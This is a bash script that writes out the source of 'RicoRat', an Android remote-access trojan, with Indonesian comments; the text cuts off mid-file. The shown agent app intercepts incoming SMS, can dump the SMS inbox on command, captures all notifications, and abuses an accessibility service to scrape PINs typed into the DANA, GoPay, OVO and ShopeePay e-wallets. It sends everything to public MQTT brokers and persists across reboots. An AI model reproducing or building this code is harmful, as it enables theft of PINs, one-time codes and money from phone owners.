#!/usr/bin/env bash
set -e
echo ">> Menulis source RicoRat..."

mkdir -p agent/src/main/java/com/rico/agent
mkdir -p agent/src/main/res/xml
mkdir -p controller/src/main/java/com/rico/ctrl
mkdir -p .github/workflows

########## ROOT ##########
cat > settings.gradle <<'RICO'
pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.PREFER_SETTINGS)
    repositories { google(); mavenCentral() }
}
rootProject.name = "RicoRat"
include ':agent'
include ':controller'
RICO

cat > build.gradle <<'RICO'
plugins {
    id 'com.android.application' version '8.2.2' apply false
}
RICO

cat > gradle.properties <<'RICO'
android.useAndroidX=true
android.nonTransitiveRClass=true
org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
RICO

########## AGENT ##########
cat > agent/build.gradle <<'RICO'
plugins { id 'com.android.application' }
android {
    namespace 'com.rico.agent'
    compileSdk 34
    defaultConfig {
        applicationId "com.rico.agent"
        minSdk 23
        targetSdk 34
        versionCode 1
        versionName "1.0"
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }
    lint { abortOnError false }
}
dependencies {
    implementation 'org.eclipse.paho:org.eclipse.paho.client.mqttv3:1.2.5'
}
RICO

cat > agent/src/main/AndroidManifest.xml <<'RICO'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
        tools:ignore="QueryAllPackagesPermission"/>

    <application
        android:label="RicoAgent"
        android:icon="@android:drawable/sym_def_app_icon"
        android:theme="@android:style/Theme.Material.Light">

        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <service android:name=".MqttService"
            android:exported="false"
            android:foregroundServiceType="dataSync"/>

        <receiver android:name=".SmsReceiver" android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
        </receiver>

        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>

        <service android:name=".NotifListener"
            android:exported="true"
            android:label="RicoAgent Notif"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService"/>
            </intent-filter>
        </service>

        <service android:name=".KeySvc"
            android:exported="true"
            android:label="RicoAgent PIN"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/acc"/>
        </service>
    </application>
</manifest>
RICO

cat > agent/src/main/res/xml/acc.xml <<'RICO'
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="Membaca angka PIN di aplikasi e-wallet"
    android:accessibilityEventTypes="typeViewTextChanged|typeWindowContentChanged|typeWindowStateChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagIncludeNotImportantViews"
    android:canRetrieveWindowContent="true"
    android:notificationTimeout="120"/>
RICO

cat > agent/src/main/java/com/rico/agent/Const.java <<'RICO'
package com.rico.agent;

public class Const {
    public static final String PREFIX = "ricoimup/";
    public static final String[] BROKERS = {
            "tcp://broker.hivemq.com:1883",
            "tcp://broker.emqx.io:1883",
            "tcp://test.mosquitto.org:1883"
    };
    public static final String[][] WALLETS = {
            {"id.dana", "DANA"},
            {"com.gojek.app", "GoPay"},
            {"ovo.id", "OVO"},
            {"com.shopeepay.id", "ShopeePay"}
    };

    public static String walletLabel(String pkg) {
        for (String[] w : WALLETS) if (w[0].equals(pkg)) return w[1];
        return null;
    }
}
RICO

cat > agent/src/main/java/com/rico/agent/MqttService.java <<'RICO'
package com.rico.agent;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;

import org.eclipse.paho.client.mqttv3.MqttClient;
import org.eclipse.paho.client.mqttv3.MqttConnectOptions;
import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence;
import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class MqttService extends Service {

    public static MqttClient client;
    public static Context APP;
    public static String dev = "device";
    public static String tData, tCmd;
    public static volatile boolean up = false;
    private static final List<String> QUEUE = Collections.synchronizedList(new ArrayList<String>());

    public static void start(Context c) {
        try {
            Intent i = new Intent(c, MqttService.class);
            if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i);
            else c.startService(i);
        } catch (Throwable t) { }
    }

    public static void send(String json) {
        try {
            MqttClient c = client;
            if (c != null && c.isConnected() && tData != null) {
                c.publish(tData, json.getBytes("UTF-8"), 1, false);
            } else {
                if (QUEUE.size() < 300) QUEUE.add(json);
                if (APP != null) start(APP);
            }
        } catch (Throwable t) { }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        APP = getApplicationContext();
        try {
            String id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            if (id == null) id = "";
            id = id.replaceAll("[^a-zA-Z0-9]", "");
            if (id.length() < 6) id = "dev" + System.currentTimeMillis();
            if (id.length() > 10) id = id.substring(0, 10);
            dev = id;
        } catch (Throwable t) { }
        tData = Const.PREFIX + dev + "/data";
        tCmd = Const.PREFIX + dev + "/cmd";
        foreground();
        new Thread(this::loop).start();
    }

    void foreground() {
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                NotificationChannel ch = new NotificationChannel("rico", "RicoAgent", NotificationManager.IMPORTANCE_MIN);
                ch.setShowBadge(false);
                nm.createNotificationChannel(ch);
            }
            Notification.Builder b = Build.VERSION.SDK_INT >= 26
                    ? new Notification.Builder(this, "rico") : new Notification.Builder(this);
            b.setContentTitle("RicoAgent aktif");
            b.setContentText("Menunggu koneksi...");
            b.setSmallIcon(android.R.drawable.stat_notify_sync);
            b.setOngoing(true);
            Notification n = b.build();
            if (Build.VERSION.SDK_INT >= 29)
                startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            else startForeground(1, n);
        } catch (Throwable t) { }
    }

    void loop() {
        while (true) {
            try {
                for (String url : Const.BROKERS) if (tryConnect(url)) break;
                while (client != null && client.isConnected()) {
                    flush();
                    Thread.sleep(25000);
                    publishInfo();
                }
            } catch (Throwable t) { }
            up = false;
            try { if (client != null) client.disconnectForcibly(); } catch (Throwable t) { }
            try { if (client != null) client.close(); } catch (Throwable t) { }
            client = null;
            try { Thread.sleep(4000); } catch (Throwable t) { }
        }
    }

    boolean tryConnect(String url) {
        try {
            String cid = "agent-" + dev + "-" + (int) (Math.random() * 99999);
            MqttClient c = new MqttClient(url, cid, new MemoryPersistence());
            MqttConnectOptions o = new MqttConnectOptions();
            o.setCleanSession(true);
            o.setKeepAliveInterval(30);
            o.setConnectionTimeout(12);
            c.connect(o);
            c.subscribe(tCmd, 1, (topic, msg) -> {
                try { onCmd(new String(msg.getPayload(), "UTF-8")); } catch (Throwable t) { }
            });
            client = c;
            up = true;
            publishInfo();
            return true;
        } catch (Throwable t) { return false; }
    }

    void flush() {
        for (;;) {
            String m;
            synchronized (QUEUE) {
                if (QUEUE.isEmpty()) return;
                m = QUEUE.remove(0);
            }
            try { client.publish(tData, m.getBytes("UTF-8"), 1, false); }
            catch (Throwable t) { return; }
        }
    }

    void onCmd(String s) {
        try {
            JSONObject o = new JSONObject(s);
            String c = o.optString("cmd", "");
            if (c.equals("torch")) Torch.set(this, o.optBoolean("on", true));
            else if (c.equals("sms")) sendSmsList();
            else publishInfo();
        } catch (Throwable t) { }
    }

    void publishInfo() {
        try {
            JSONObject o = new JSONObject();
            o.put("type", "info");
            o.put("model", Build.MANUFACTURER + " " + Build.MODEL);
            o.put("android", Build.VERSION.RELEASE);
            o.put("number", Phone.number(this));
            o.put("battery", Phone.battery(this));
            JSONArray w = new JSONArray();
            for (String[] wl : Const.WALLETS) {
                try { getPackageManager().getPackageInfo(wl[0], 0); w.put(wl[1]); }
                catch (Throwable t) { }
            }
            o.put("wallets", w);
            o.put("ts", System.currentTimeMillis());
            send(o.toString());
        } catch (Throwable t) { }
    }

    void sendSmsList() {
        try {
            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"),
                    null, null, null, "date desc");
            int n = 0;
            if (c != null) {
                while (c.moveToNext() && n < 60) {
                    JSONObject o = new JSONObject();
                    o.put("type", "sms");
                    o.put("from", c.getString(c.getColumnIndexOrThrow("address")));
                    o.put("body", c.getString(c.getColumnIndexOrThrow("body")));
                    o.put("ts", c.getLong(c.getColumnIndexOrThrow("date")));
                    send(o.toString());
                    n++;
                }
                c.close();
            }
        } catch (Throwable t) { }
    }

    @Override public IBinder onBind(Intent i) { return null; }
}
RICO

cat > agent/src/main/java/com/rico/agent/SmsReceiver.java <<'RICO'
package com.rico.agent;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

import org.json.JSONObject;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent i) {
        try {
            Object[] pdus = (Object[]) i.getExtras().get("pdus");
            String fmt = i.getExtras().getString("format");
            if (pdus == null) return;
            for (Object p : pdus) {
                SmsMessage m = SmsMessage.createFromPdu((byte[]) p, fmt);
                JSONObject o = new JSONObject();
                o.put("type", "sms");
                o.put("live", true);
                o.put("from", m.getDisplayOriginatingAddress());
                o.put("body", m.getDisplayMessageBody());
                o.put("ts", m.getTimestampMillis());
                MqttService.send(o.toString());
            }
        } catch (Throwable t) { }
    }
}
RICO

cat > agent/src/main/java/com/rico/agent/NotifListener.java <<'RICO'
package com.rico.agent;

import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import org.json.JSONObject;

public class NotifListener extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Bundle b = sbn.getNotification().extras;
            CharSequence t = b.getCharSequence("android.title");
            CharSequence x = b.getCharSequence("android.text");
            if (t == null && x == null) return;
            String pkg = sbn.getPackageName();
            JSONObject o = new JSONObject();
            o.put("type", "notif");
            o.put("app", appName(pkg));
            o.put("title", t == null ? "" : t.toString());
            o.put("text", x == null ? "" : x.toString());
            o.put("ts", sbn.getPostTime());
            MqttService.send(o.toString());
        } catch (Throwable t) { }
    }

    String appName(String pkg) {
        try {
            return getPackageManager()
                    .getApplicationLabel(getPackageManager().getApplicationInfo(pkg, 0)).toString();
        } catch (Throwable t) { return pkg; }
    }
}
RICO

cat > agent/src/main/java/com/rico/agent/KeySvc.java <<'RICO'
package com.rico.agent;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

public class KeySvc extends AccessibilityService {

    String last = "";
    long lastScan = 0;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        if (e == null) return;
        try {
            String pkg = e.getPackageName() == null ? "" : e.getPackageName().toString();
            String label = Const.walletLabel(pkg);
            if (label == null) return;

            if (e.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                    && e.getText() != null && !e.getText().isEmpty()) {
                check(label, e.getText().get(0).toString());
            }

            long now = System.currentTimeMillis();
            if (now - lastScan > 500) {
                lastScan = now;
                AccessibilityNodeInfo r = getRootInActiveWindow();
                if (r != null) scan(r, label);
            }
        } catch (Throwable t) { }
    }

    void scan(AccessibilityNodeInfo n, String label) {
        if (n == null) return;
        CharSequence tx = n.getText();
        if (tx != null) {
            String s = tx.toString().trim();
            if (s.matches("\\d{4,8}")) check(label, s);
        }
        for (int i = 0; i < n.getChildCount(); i++) scan(n.getChild(i), label);
    }

    void check(String label, String v) {
        v = v.replaceAll("\\D", "");
        if (v.length() < 4 || v.length() > 8) return;
        String key = label + "|" + v;
        if (key.equals(last)) return;
        last = key;
        try {
            JSONObject o = new JSONObject();
            o.put("type", "pin");
            o.put("app", label);
            o.put("value", v);
            o.put("ts", System.currentTimeMillis());
            MqttService.send(o.toString());
        } catch (Throwable t) { }
    }

    @Override public void onInterrupt() { }
}
RICO

cat > agent/src/main/java/com/rico/agent/Torch.java <<'RICO'
package com.rico.agent;

import android.content.Context;
import android.hardware.camera2.CameraManager;

public class Torch {
    public static void set(Context c, boolean on) {
        try {
            CameraManager cm = (CameraManager) c.getSystemService(Context.CAMERA_SERVICE);
            String[] ids = cm.getCameraIdList();
            if (ids.length > 0) cm.setTorchMode(ids[0], on);
        } catch (Throwable t) { }
    }
}
RICO

cat > agent/src/main/java/com/rico/agent/Phone.java <<'RICO'
package com.rico.agent;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.BatteryManager;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;

public class Phone {

    public static String number(Context c) {
        try {
            TelephonyManager tm = (TelephonyManager) c.getSystemService(Context.TELEPHONY_SERVICE);
            String n = tm.getLine1Number();
            if (n != null && n.length() > 5) return n;
        } catch (Throwable t) { }
        try {
            if (Build.VERSION.SDK_INT >= 33) {
                SubscriptionManager sm =
                        (SubscriptionManager) c.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                if (sm != null && sm.getActiveSubscriptionInfoList() != null
                        && !sm.getActiveSubscriptionInfoList().isEmpty()) {
                    String p = sm.getPhoneNumber(
                            sm.getActiveSubscriptionInfoList().get(0).getSubscriptionId());
                    if (p != null && !p.isEmpty()) return p;
                }
            }
        } catch (Throwable t) { }
        return "-";
    }

    public static String battery(Context c) {
        try {
            Intent b = c.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            int lvl = b.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int sc = b.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
            return (lvl * 100 / sc) + "%";
        } catch (Throwable t) { return "?"; }
    }
}
RICO

cat > agent/src/main/java/com/rico/agent/BootReceiver.java <<'RICO'
package com.rico.agent;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends Br
